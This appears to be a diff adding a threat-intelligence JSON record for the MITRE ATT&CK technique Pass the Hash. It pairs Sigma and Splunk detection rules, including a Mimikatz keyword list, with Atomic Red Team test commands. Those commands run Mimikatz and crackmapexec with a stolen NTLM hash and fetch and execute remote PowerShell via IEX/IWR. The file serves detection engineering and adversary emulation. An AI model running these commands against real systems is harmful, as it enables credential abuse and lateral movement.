@@ -1,0 +1,264 @@
+{
+    "id": "T1550.002",
+    "name": "Pass the Hash",
+    "description": "Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access](TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](T1550.003) attacks.(Citation: Stealthbits Overpass-the-Hash)",
+    "platforms": "Windows",
+    "kill_chain_phases": "Defense Evasion, Lateral Movement",
+    "data_sources": "User Account: User Account Authentication, Logon Session: Logon Session Creation, Active Directory: Active Directory Credential Request",
+    "detection": "Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.\nEvent ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)",
+    "url": "https://attack.mitre.org/techniques/T1550/002",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1550.002",
+                "atomic_attack_guid": "ec23cef9-27d9-46e4-a68d-6f75f7b86908",
+                "atomic_attack_name": "Mimikatz Pass the Hash",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "HackTool - Mimikatz Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml",
+                        "remote_content": "title: HackTool - Mimikatz Execution\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nstatus: test\ndescription: Detection well-known mimikatz command line arguments\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://tools.thehacker.recipes/mimikatz/modules\nauthor: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton\ndate: 2019-10-22\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.001\n    - attack.t1003.002\n    - attack.t1003.004\n    - attack.t1003.005\n    - attack.t1003.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_name:\n        CommandLine|contains:\n            - 'DumpCreds'\n            - 'mimikatz'\n    selection_function_names: # To cover functions from modules that are not in module_names\n        CommandLine|contains:\n            - '::aadcookie' # misc module\n            - '::detours' # misc module\n            - '::memssp' # misc module\n            - '::mflt' # misc module\n            - '::ncroutemon' # misc module\n            - '::ngcsign' # misc module\n            - '::printnightmare' # misc module\n            - '::skeleton' # misc module\n            - '::preshutdown'  # service module\n            - '::mstsc'  # ts module\n            - '::multirdp'  # ts module\n    selection_module_names:\n        CommandLine|contains:\n            - 'rpc::'\n            - 'token::'\n            - 'crypto::'\n            - 'dpapi::'\n            - 'sekurlsa::'\n            - 'kerberos::'\n            - 'lsadump::'\n            - 'privilege::'\n            - 'process::'\n            - 'vault::'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows Mimikatz Binary Execution",
+                        "rule_link": "https://research.splunk.com/endpoint/a9e0d6d3-9676-4e26-994d-4e0406bb4467/"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "24549159-ac1b-479c-8175-d42aea947cae",
+                    "0319b483-5973-4932-91ea-5a44c2975b24",
+                    "8eef149c-bd26-49f2-9e5a-9b00e3af499b",
+                    "e624264c-033a-424d-9fd7-fc9c3bbdb03e",
+                    "f8d98d6c-7a07-4d74-b064-dd4a3c244528",
+                    "192a0330-c20b-4356-90b6-7b7049ae0b87",
+                    "e9d4ab66-a532-4ef7-a502-66a9e4a34f5d",
+                    "98c3bcf1-56f2-49dc-9d8d-c66cf190238b"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "24549159-ac1b-479c-8175-d42aea947cae",
+                        "lookup_data": {
+                            "description": "This events that are generated when using the hacktool Ruler by Sensepost",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/05/31\ndescription: This events that are generated when using the hacktool Ruler by Sensepost\ndetection:\n  condition: (1 of selection*)\n  selection1:\n    EventID: 4776\n    Workstation: RULER\n  selection2:\n    EventID:\n    - 4624\n    - 4625\n    WorkstationName: RULER\nfalsepositives:\n- Go utilities that use staaldraad awesome NTLM library\nid: 24549159-ac1b-479c-8175-d42aea947cae\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://github.com/sensepost/ruler\n- https://github.com/sensepost/ruler/issues/47\n- https://github.com/staaldraad/go-ntlm/blob/cd032d41aa8ce5751c07cb7945400c0f5c81e2eb/ntlm/ntlmv1.go#L427\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4776\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624\nstatus: test\ntags:\n- attack.discovery\n- attack.execution\n- attack.t1087\n- attack.t1114\n- attack.t1059\n- attack.t1550.002\ntitle: Hacktool Ruler\n",
+                            "sigma:id": "24549159-ac1b-479c-8175-d42aea947cae",
+                            "title": "Hacktool Ruler",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0319b483-5973-4932-91ea-5a44c2975b24",
+                        "lookup_data": {
+                            "description": "Conti Ransomware",
+                            "link": "http://www.botvrij.eu/data/feed-osint/0319b483-5973-4932-91ea-5a44c2975b24.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1621181463",
+                            "uuid": "0319b483-5973-4932-91ea-5a44c2975b24",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8eef149c-bd26-49f2-9e5a-9b00e3af499b",
+                        "lookup_data": {
+                            "description": "Detects the attack technique pass the hash which is used to move laterally inside the network",
+                            "raw": "author: Dave Kennedy, Jeff Warren (method) / David Vassallo (rule)\ndate: 2019/06/14\ndescription: Detects the attack technique pass the hash which is used to move laterally\n  inside the network\ndetection:\n  condition: 1 of selection_* and not filter\n  filter:\n    TargetUserName: ANONYMOUS LOGON\n  selection_logon3:\n    EventID: 4624\n    KeyLength: 0\n    LogonProcessName: NtLmSsp\n    LogonType: 3\n    SubjectUserSid: S-1-0-0\n  selection_logon9:\n    EventID: 4624\n    LogonProcessName: seclogo\n    LogonType: 9\nfalsepositives:\n- Administrator activity\nid: 8eef149c-bd26-49f2-9e5a-9b00e3af499b\nlevel: medium\nlogsource:\n  definition: The successful use of PtH for lateral movement between workstations\n    would trigger event ID 4624\n  product: windows\n  service: security\nmodified: 2022/10/05\nreferences:\n- https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events\n- https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis\n- https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/\nstatus: stable\ntags:\n- attack.lateral_movement\n- attack.t1550.002\ntitle: Pass the Hash Activity 2\n",
+                            "sigma:id": "8eef149c-bd26-49f2-9e5a-9b00e3af499b",
+                            "title": "Pass the Hash Activity 2",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e624264c-033a-424d-9fd7-fc9c3bbdb03e",
+                        "lookup_data": {
+                            "capec": "CAPEC-644",
+                            "mitre-attack-id": "T1550.002",
+                            "mitre-cti:description": "Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)",
+                            "mitre-cti:name": "Pass the Hash",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Blake Strom, Microsoft 365 Defender', 'Travis Smith, Tripwire'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e', 'type': 'attack-pattern', 'created': '2020-01-30T16:36:51.184Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1550.002', 'url': 'https://attack.mitre.org/techniques/T1550/002'}, {'external_id': 'CAPEC-644', 'source_name': 'capec', 'url': 'https://capec.mitre.org/data/definitions/644.html'}, {'source_name': 'Stealthbits Overpass-the-Hash', 'url': 'https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/', 'description': 'Warren, J. (2019, February 26). How to Detect Overpass-the-Hash Attacks. Retrieved February 4, 2021.'}], 'modified': '2021-08-31T19:55:02.702Z', 'name': 'Pass the Hash', 'description': 'Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user\\'s cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\\n\\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\\n\\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}], 'x_mitre_detection': 'Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.\\n\\nEvent ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Active Directory: Active Directory Credential Request', 'Logon Session: Logon Session Creation', 'User Account: User Account Authentication'], 'x_mitre_defense_bypassed': ['System Access Controls']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f8d98d6c-7a07-4d74-b064-dd4a3c244528",
+                        "lookup_data": {
+                            "description": "Detects the attack technique pass the hash which is used to move laterally inside the network",
+                            "raw": "author: Ilias el Matani (rule), The Information Assurance Directorate at the NSA (method)\ndate: 2017/03/08\ndescription: Detects the attack technique pass the hash which is used to move laterally\n  inside the network\ndetection:\n  condition: selection and not filter\n  filter:\n    AccountName: ANONYMOUS LOGON\n  selection:\n  - ComputerName: '%Workstations%'\n    EventID: 4624\n    LogonProcessName: NtLmSsp\n    LogonType: '3'\n    WorkstationName: '%Workstations%'\n  - ComputerName: '%Workstations%'\n    EventID: 4625\n    LogonProcessName: NtLmSsp\n    LogonType: '3'\n    WorkstationName: '%Workstations%'\nfalsepositives:\n- Administrator activity\n- Penetration tests\nid: f8d98d6c-7a07-4d74-b064-dd4a3c244528\nlevel: medium\nlogsource:\n  definition: The successful use of PtH for lateral movement between workstations\n    would trigger event ID 4624, a failed logon attempt would trigger an event ID\n    4625\n  product: windows\n  service: security\nreferences:\n- https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events\nstatus: experimental\ntags:\n- attack.lateral_movement\n- attack.t1075\n- car.2016-04-004\n- attack.t1550.002\ntitle: Pass the Hash Activity\n",
+                            "sigma:id": "f8d98d6c-7a07-4d74-b064-dd4a3c244528",
+                            "title": "Pass the Hash Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "192a0330-c20b-4356-90b6-7b7049ae0b87",
+                        "lookup_data": {
+                            "description": "Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz's sekurlsa::pth module.",
+                            "raw": "author: Roberto Rodriguez (source), Dominik Schaudel (rule)\ndate: 2018/02/12\ndescription: Detects successful logon with logon type 9 (NewCredentials) which matches\n  the Overpass the Hash behavior of e.g Mimikatz's sekurlsa::pth module.\ndetection:\n  condition: selection\n  selection:\n    AuthenticationPackageName: Negotiate\n    EventID: 4624\n    LogonProcessName: seclogo\n    LogonType: 9\nfalsepositives:\n- Runas command-line tool using /netonly parameter\nid: 192a0330-c20b-4356-90b6-7b7049ae0b87\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2021/11/27\nreferences:\n- https://cyberwardog.blogspot.de/2017/04/chronicles-of-threat-hunter-hunting-for.html\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.s0002\n- attack.t1550.002\ntitle: Successful Overpass the Hash Attempt\n",
+                            "sigma:id": "192a0330-c20b-4356-90b6-7b7049ae0b87",
+                            "title": "Successful Overpass the Hash Attempt",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e9d4ab66-a532-4ef7-a502-66a9e4a34f5d",
+                        "lookup_data": {
+                            "description": "Detects the reporting of NTLMv1 being used between a client and server",
+                            "raw": "author: Tim Shelton\ndate: 2022/04/26\ndescription: Detects the reporting of NTLMv1 being used between a client and server\ndetection:\n  condition: selection\n  selection:\n    EventID: 6038\n    Provider_Name: LsaSrv\nfalsepositives:\n- Environments that use NTLMv1\nfields:\n- EventID\n- Provider_Name\nid: e9d4ab66-a532-4ef7-a502-66a9e4a34f5d\nlevel: low\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/05/02\nreferences:\n- https://attack.mitre.org/techniques/T1550/002/\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1550.002\n- attack.s0363\ntitle: NTLMv1 Logon Between Client and Server\n",
+                            "sigma:id": "e9d4ab66-a532-4ef7-a502-66a9e4a34f5d",
+                            "title": "NTLMv1 Logon Between Client and Server",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "98c3bcf1-56f2-49dc-9d8d-c66cf190238b",
+                        "lookup_data": {
+                            "description": "Detects logons using NTLM, which could be caused by a legacy source or attackers",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/06/08\ndescription: Detects logons using NTLM, which could be caused by a legacy source or\n  attackers\ndetection:\n  condition: selection\n  selection:\n    EventID: 8002\n    ProcessName|contains: '*'\nfalsepositives:\n- Legacy hosts\nid: 98c3bcf1-56f2-49dc-9d8d-c66cf190238b\nlevel: low\nlogsource:\n  definition: Requires events from Microsoft-Windows-NTLM/Operational\n  product: windows\n  service: ntlm\nmodified: 2022/10/05\nreferences:\n- https://twitter.com/JohnLaTwC/status/1004895028995477505\n- https://goo.gl/PsqrhT\nstatus: experimental\ntags:\n- attack.lateral_movement\n- attack.t1550.002\ntitle: NTLM Logon\n",
+                            "sigma:id": "98c3bcf1-56f2-49dc-9d8d-c66cf190238b",
+                            "title": "NTLM Logon",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1550.002",
+                "display_name": "Use Alternate Authentication Material: Pass the Hash",
+                "atomic_tests": [
+                    {
+                        "name": "Mimikatz Pass the Hash",
+                        "auto_generated_guid": "ec23cef9-27d9-46e4-a68d-6f75f7b86908",
+                        "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "user_name": {
+                                "description": "username",
+                                "type": "string",
+                                "default": "Administrator"
+                            },
+                            "ntlm": {
+                                "description": "ntlm hash",
+                                "type": "string",
+                                "default": "cc36cf7a8514893efccd3324464tkg1a"
+                            },
+                            "domain": {
+                                "description": "domain",
+                                "type": "string",
+                                "default": "%userdnsdomain%"
+                            },
+                            "mimikatz_path": {
+                                "description": "mimikatz windows executable",
+                                "type": "path",
+                                "default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+                                "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "#{mimikatz_path} \"sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\"\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "crackmapexec Pass the Hash",
+                        "auto_generated_guid": "eb05b028-16c8-4ad8-adea-6f5b219da9a9",
+                        "description": "command execute with crackmapexec\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "user_name": {
+                                "description": "username",
+                                "type": "string",
+                                "default": "Administrator"
+                            },
+                            "crackmapexec_exe": {
+                                "description": "crackmapexec windows executable",
+                                "type": "path",
+                                "default": "C:\\CrackMapExecWin\\crackmapexec.exe"
+                            },
+                            "command": {
+                                "description": "command to execute",
+                                "type": "string",
+                                "default": "whoami"
+                            },
+                            "ntlm": {
+                                "description": "command",
+                                "type": "string",
+                                "default": "cc36cf7a8514893efccd3324464tkg1a"
+                            },
+                            "domain": {
+                                "description": "domain",
+                                "type": "string",
+                                "default": "%userdnsdomain%"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n",
+                                "prereq_command": "if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Invoke-WMIExec Pass the Hash",
+                        "auto_generated_guid": "f8757545-b00a-4e4e-8cfb-8cfb961ee713",
+                        "description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "ntlm": {
+                                "description": "ntlm hash",
+                                "type": "string",
+                                "default": "cc36cf7a8514893efccd3324464tkg1a"
+                            },
+                            "user_name": {
+                                "description": "username",
+                                "type": "string",
+                                "default": "Administrator"
+                            },
+                            "command": {
+                                "description": "Command to run on target system",
+                                "type": "string",
+                                "default": "hostname"
+                            },
+                            "target": {
+                                "description": "System to run command on",
+                                "type": "string",
+                                "default": "$env:COMPUTERNAME"
+                            }
+                        },
+                        "executor": {
+                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}",
+                            "name": "powershell"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 15:56:11"
+}
